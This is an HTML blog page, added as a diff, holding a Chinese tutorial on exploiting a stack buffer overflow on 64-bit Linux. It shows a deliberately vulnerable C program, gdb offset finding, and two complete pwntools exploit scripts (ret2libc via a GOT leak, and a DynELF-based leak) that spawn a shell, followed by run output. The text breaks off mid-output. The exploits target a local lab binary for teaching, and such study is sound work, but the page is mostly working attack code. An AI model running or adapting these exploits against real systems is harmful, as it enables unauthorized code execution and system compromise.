@@ -1,0 +1,909 @@
+
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="64位linux下栈溢出漏洞利用linux_64与linux_86的区别有：可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。
+有很多代码都是借鉴一步一步x64教程中的，就不自己">
+<meta property="og:type" content="article">
+<meta property="og:title" content="64位linux下栈溢出漏洞利用">
+<meta property="og:url" content="http://yoursite.com/2017/10/15/64位linux下栈溢出漏洞利用/index.html">
+<meta property="og:site_name" content="hackyzh'blog">
+<meta property="og:description" content="64位linux下栈溢出漏洞利用linux_64与linux_86的区别有：可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。
+有很多代码都是借鉴一步一步x64教程中的，就不自己">
+<meta property="og:updated_time" content="2017-10-15T09:13:57.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="64位linux下栈溢出漏洞利用">
+<meta name="twitter:description" content="64位linux下栈溢出漏洞利用linux_64与linux_86的区别有：可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。
+有很多代码都是借鉴一步一步x64教程中的，就不自己">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 1,
+      author: 'hackyzh'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/10/15/64位linux下栈溢出漏洞利用/"/>
+
+  <title> 64位linux下栈溢出漏洞利用 | hackyzh'blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?657dfc0df5002745c7be83cc9e53b12d";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">hackyzh'blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                64位linux下栈溢出漏洞利用
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2017-10-15T17:13:06+08:00" content="2017-10-15">
+              2017-10-15
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/10/15/64位linux下栈溢出漏洞利用/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/10/15/64位linux下栈溢出漏洞利用/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="64位linux下栈溢出漏洞利用"><a href="#64位linux下栈溢出漏洞利用" class="headerlink" title="64位linux下栈溢出漏洞利用"></a><strong>64位linux下栈溢出漏洞利用</strong></h1><p>linux_64与linux_86的区别有：可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p>
+<p>有很多代码都是借鉴一步一步x64教程中的，就不自己写了，然后发现x64教程中有很多问题，自己手动调试写了exp，漏洞源码vuln.c：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">![#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">    char buf[128];</div><div class="line">    read(STDIN_FILENO, buf, 512);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">    write(STDOUT_FILENO, &quot;pwn it\n&quot;, 7);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;](http://note.youdao.com/favicon.ico)</div></pre></td></tr></table></figure></p>
+<p>编译命令：<br>gcc -fno-stack-protector vuln.c -o vuln</p>
+<p>编译好之后，利用gdb调试vuln。我的gdb配合了peda和pwndbg这两个工具，看起来更加直观清楚。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Reading symbols from vuln...done.</div><div class="line">pwndbg&gt; pattern create 150</div><div class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;</div><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/hackyzh/Desktop/pwn/vuln </div><div class="line">Hello, World</div><div class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line"></div><div class="line">--------------------------------</div><div class="line">pwndbg&gt; x/gx $rsp</div><div class="line">0x7fffffffdeb8:	0x41416d4141514141</div></pre></td></tr></table></figure>
+<p>观察以上调试信息，可以观察到$rsp处的值为0x41416d4141514141，通过gdb-peda来计算溢出的地方，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; pattern_offset 0x41416d4141514141</div><div class="line">4702159612987654465 found at offset: 136</div></pre></td></tr></table></figure></p>
+<p>得到offset之后我们就可以尝试控制rip寄存器的值，返回到我们想要执行的地方。通过python命令来输出payload<br>python -c ‘print “A”*136+”AAAAAA\x00\x00”‘ &gt; payload。之后进行gdb调试，运行刚刚产生的payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">RAX: 0x91 </div><div class="line">RBX: 0x0 </div><div class="line">RCX: 0x7ffff7b00330 (&lt;__read_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001)</div><div class="line">RDX: 0x200 </div><div class="line">RSI: 0x7fffffffde30 (&apos;A&apos; &lt;repeats 15 times&gt;...)</div><div class="line">RDI: 0x0 </div><div class="line">RBP: 0x4141414141414141 (&apos;AAAAAAAA&apos;)</div><div class="line">RSP: 0x7fffffffdec0 --&gt; 0x7fffffffdf0a --&gt; 0x49010c6ebf104ce </div><div class="line">RIP: 0x414141414141 (&apos;AAAAAA&apos;)</div><div class="line">R8 : 0x7ffff7dd4e80 --&gt; 0x0 </div><div class="line">R9 : 0x7ffff7dea700 (&lt;_dl_fini&gt;:	push   rbp)</div><div class="line">R10: 0x7fffffffdbf0 --&gt; 0x0 </div><div class="line">R11: 0x246 </div><div class="line">R12: 0x400490 (&lt;_start&gt;:	xor    ebp,ebp)</div><div class="line">R13: 0x7fffffffdfb0 --&gt; 0x1 </div><div class="line">R14: 0x0 </div><div class="line">R15: 0x0</div><div class="line">EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)</div></pre></td></tr></table></figure></p>
+<p>观察到rip寄存器的值已经被我们控制。<br>写exp前先可以理解下这篇文章 <a href="http://bobao.360.cn/learning/detail/3298.html?utm_source=tuicool&amp;utm_medium=referral。" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3298.html?utm_source=tuicool&amp;utm_medium=referral。</a></p>
+<h2 id="0x01-有libc情况下的利用"><a href="#0x01-有libc情况下的利用" class="headerlink" title="0x01 有libc情况下的利用"></a>0x01 有libc情况下的利用</h2><p>最终可以的exp如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(&apos;vuln&apos;)</div><div class="line">libc = ELF(&apos;libc.so.6&apos;)</div><div class="line"></div><div class="line">p = process(&apos;./vuln&apos;)</div><div class="line"></div><div class="line">got_write = elf.got[&apos;write&apos;]</div><div class="line">print &quot;got_write: &quot; + hex(got_write)</div><div class="line">got_read = elf.got[&apos;read&apos;]</div><div class="line">print &quot;got_read: &quot; + hex(got_read)</div><div class="line"></div><div class="line">start = 0x400490</div><div class="line">poprdi=0x400633</div><div class="line">off_system_addr = libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]</div><div class="line">print &quot;off_system_addr: &quot; + hex(off_system_addr)</div><div class="line"></div><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x40062a) +p64(0) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(1) # pop_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x400610) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(start)</div><div class="line"></div><div class="line">p.recvuntil(&quot;pwn it\n&quot;)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload1#############\n&quot;</div><div class="line">p.send(payload1)</div><div class="line">sleep(1)</div><div class="line"></div><div class="line">write_addr = u64(p.recv(8))</div><div class="line">print &quot;write_addr: &quot; + hex(write_addr)</div><div class="line"></div><div class="line">system_addr = write_addr - off_system_addr</div><div class="line">print &quot;system_addr: &quot; + hex(system_addr)</div><div class="line"></div><div class="line">bss_addr=0x601048</div><div class="line"></div><div class="line">p.recvuntil(&quot;pwn it\n&quot;)</div><div class="line"></div><div class="line"></div><div class="line">payload2 =  &quot;\x00&quot;*136</div><div class="line">payload2 += p64(0x40062a) + p64(0) + p64(1) + p64(got_read) + p64(8) + p64(bss_addr) + p64(0) # pop_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload2 += p64(0x400610) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload2 += &quot;\x00&quot;*56</div><div class="line">payload2 += p64(start)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload2#############\n&quot;</div><div class="line">p.send(payload2)</div><div class="line">sleep(1)</div><div class="line">p.send(&quot;/bin/sh\0&quot;)</div><div class="line">sleep(1)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload3 =  &quot;\x00&quot;*136</div><div class="line">payload3 += p64(poprdi)+p64(bss_addr)</div><div class="line">payload3 += p64(system_addr)</div><div class="line">payload3 += p64(start)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload3#############\n&quot;</div><div class="line"></div><div class="line">sleep(1)</div><div class="line">p.send(payload3)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>以上地址可以用objdump -d vuln得出，运行结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">[*] &apos;/home/hackyzh/Desktop/pwn/vuln&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[*] &apos;/home/hackyzh/Desktop/pwn/libc.so.6&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">[+] Starting local process &apos;./vuln&apos;: pid 1769</div><div class="line">got_write: 0x601018</div><div class="line">got_read: 0x601020</div><div class="line">off_system_addr: 0xa8df0</div><div class="line"></div><div class="line">#############sending payload1#############</div><div class="line"></div><div class="line">write_addr: 0x7ffff7b00380</div><div class="line">system_addr: 0x7ffff7a57590</div><div class="line"></div><div class="line">#############sending payload2#############</div><div class="line"></div><div class="line"></div><div class="line">#############sending payload3#############</div><div class="line"></div><div class="line">[*] Switching to interactive mode</div><div class="line">Hello, World</div><div class="line">$ id</div><div class="line">uid=1000(hackyzh) gid=1000(hackyzh) groups=1000(hackyzh),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure></p>
+<h2 id="0x02-无libc的情况下"><a href="#0x02-无libc的情况下" class="headerlink" title="0x02 无libc的情况下"></a>0x02 无libc的情况下</h2><p>最终的exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">from pwn import *</div><div class="line">elf = ELF(&apos;vuln&apos;)</div><div class="line">p = process(&apos;./vuln&apos;)</div><div class="line"></div><div class="line"></div><div class="line">got_write = elf.got[&apos;write&apos;]</div><div class="line">print &quot;got_write: &quot;+ hex(got_write)</div><div class="line">got_read = elf.got[&apos;read&apos;]</div><div class="line">print &quot;got_read: &quot; + hex(got_read)</div><div class="line"></div><div class="line">start = 0x400490</div><div class="line">bss_addr=0x601048</div><div class="line">poprdi=0x400633</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def leak(address):</div><div class="line">    payload1 =  &quot;\x00&quot;*136</div><div class="line">    payload1 += p64(0x40062a) +p64(0) + p64(1) + p64(got_write) + p64(8) + p64(address) + p64(1) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">    payload1 += p64(0x400610) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">    payload1 += &quot;\x00&quot;*56</div><div class="line">    payload1 += p64(start)</div><div class="line">    p.send(payload1)</div><div class="line">    p.recvuntil(&quot;pwn it\n&quot;)</div><div class="line">    data=p.recv(8)</div><div class="line">    print &quot;%#x =&gt; %s&quot;% (address, (data or &apos;&apos;).encode(&apos;hex&apos;))</div><div class="line">    return data</div><div class="line">d=DynELF(leak, elf=ELF(&apos;./vuln&apos;))</div><div class="line">system_addr=d.lookup(&apos;__libc_system&apos;,&apos;libc&apos;)</div><div class="line">print &quot;systemAddress:&quot;, hex(system_addr)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload2 =  &quot;\x00&quot;*136</div><div class="line">payload2 += p64(0x40062a) + p64(0) + p64(1) + p64(got_read) + p64(8) + p64(bss_addr) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload2 += p64(0x400610) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload2 += &quot;\x00&quot;*56</div><div class="line">payload2 += p64(start)</div><div class="line"></div><div class="line">print &quot;\n#############Write /bin/sh#############\n&quot;</div><div class="line">p.send(payload2)</div><div class="line">sleep(1)</div><div class="line">p.send(&quot;/bin/sh\0&quot;)</div><div class="line">sleep(1)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">print &quot;\n#############Get Shell#############\n&quot;</div><div class="line">payload3 =  &quot;\x00&quot;*136</div><div class="line">payload3 += p64(poprdi)+p64(bss_addr)</div><div class="line">payload3 += p64(system_addr)</div><div class="line">payload3 += p64(start)</div><div class="line">sleep(1)</div><div class="line">p.send(payload3)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>运行结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line">[*] &apos;/home/hackyzh/Desktop/pwn/vuln&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[+] Starting local process &apos;./vuln&apos;: pid 2242</div><div class="line">got_write: 0x601018</div><div class="line">got_read: 0x601020</div><div class="line">0x400000 =&gt; 7f454c4602010100</div><div class="line">[+] Loading from &apos;/home/hackyzh/Desktop/pwn/vuln&apos;: 0x7ffff7ffe1c8</div><div class="line">0x601008 =&gt; c8e1fff7ff7f0000</div><div class="line">[+] Resolving &apos;__libc_system&apos; in &apos;libc.so&apos;: 0x7ffff7ffe1c8</div><div class="line">0x600e28 =&gt; 0100000000000000</div><div class="line">0x600e38 =&gt; 0c00000000000000</div><div class="line">0x600e48 =&gt; 0d00000000000000</div><div class="line">0x600e58 =&gt; 1900000000000000</div><div class="line">0x600e68 =&gt; 1b00000000000000</div><div class="line">0x600e78 =&gt; 1a00000000000000</div><div class="line">0x600e88 =&gt; 1c00000000000000</div><div class="line">0x600e98 =&gt; f5feff6f00000000</div><div class="line">0x600ea8 =&gt; 0500000000000000</div><div class="line">0x600eb8 =&gt; 0600000000000000</div><div class="line">0x600ec8 =&gt; 0a00000000000000</div><div class="line">0x600ed8 =&gt; 0b00000000000000</div><div class="line">0x600ee8 =&gt; 1500000000000000</div><div class="line">0x600ef8 =&gt; 0300000000000000</div><div class="line">0x600f00 =&gt; 0010600000000000</div><div class="line">0x7ffff7ffe1e8 =&gt; 0000000000000000</div><div class="line">0x7ffff7ffe1d0 =&gt; 58e7fff7ff7f0000</div><div class="line">0x7ffff7ffe758 =&gt; 0000000000000000</div><div class="line">0x7ffff7ffe1e0 =&gt; 60e7fff7ff7f0000</div><div class="line">0x7ffff7ffe768 =&gt; f0ebfff7ff7f0000</div><div class="line">0x7ffff7ffebf0 =&gt; 0000000000000000</div><div class="line">0x7ffff7ffe778 =&gt; c074fff7ff7f0000</div><div class="line">0x7ffff7ff74c8 =&gt; a074fff7ff7f0000</div><div class="line">0x7ffff7ff74a0 =&gt; 2f6c69622f783836</div><div class="line">0x7ffff7ff74a8 =&gt; 5f36342d6c696e75</div><div class="line">0x7ffff7ff74b0 =&gt; 782d676e752f6c69</div><div class="line">0x7ffff7ff74b8 =&gt; 62632e736f2e3600</div><div class="line">0x7ffff7ff74c0 =&gt; 0010a1f7ff7f0000</div><div class="line">[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.</div><div class="line">0x7ffff7a11000 =&gt; 7f454c4602010100</div><div class="line">0x7ffff7ff74d0 =&gt; a02bddf7ff7f0000</div><div class="line">0x7ffff7dd2ba0 =&gt; 0100000000000000</div><div class="line">0x7ffff7dd2bb0 =&gt; 0e00000000000000</div><div class="line">0x7ffff7dd2bc0 =&gt; 0c00000000000000</div><div class="line">0x7ffff7dd2bd0 =&gt; 1900000000000000</div><div class="line">0x7ffff7dd2be0 =&gt; 1b00000000000000</div><div class="line">0x7ffff7dd2bf0 =&gt; 0400000000000000</div><div class="line">0x7ffff7dd2c00 =&gt; f5feff6f00000000</div><div class="line">0x7ffff7dd2c10 =&gt; 0500000000000000</div><div class="line">0x7ffff7dd2c20 =&gt; 0600000000000000</div><div class="line">0x7ffff7dd2c30 =&gt; 0a00000000000000</div><div class="line">0x7ffff7dd2c40 =&gt; 0b00000000000000</div><div class="line">0x7ffff7dd2c50 =&gt; 0300000000000000</div><div class="line">0x7ffff7dd2c58 =&gt; 0030ddf7ff7f0000</div><div class="line">0x7ffff7a11010 =&gt; 03003e0001000000</div><div class="line">0x7ffff7dd3008 =&gt; c074fff7ff7f0000</div><div class="line">0x7ffff7ff74e0 =&gt; 60e7fff7ff7f0000</div><div class="line">0x7ffff7ffe780 =&gt; c8e1fff7ff7f0000</div><div class="line">0x7ffff7a11180 =&gt; 4400000000000000</div><div class="line">[*] Magic did not match</div><div class="line">[*] .gnu.hash/.hash, .strtab and .symtab offsets</div><div class="line">[*] Found DT_GNU_HASH at 0x7ffff7dd2c00</div><div class="line">0x7ffff7dd2c08 =&gt; b812a1f7ff7f0000</div><div class="line">[*] Found DT_STRTAB at 0x7ffff7dd2c10</div><div class="line">0x7ffff7dd2c18 =&gt; c81da2f7ff7f0000</div><div class="line">[*] Found DT_SYMTAB at 0x7ffff7dd2c20</div><div class="line">0x7ffff7dd2c28 =&gt; 304da1f7ff7f0000</div><div class="line">[*] .gnu.hash parms</div><div 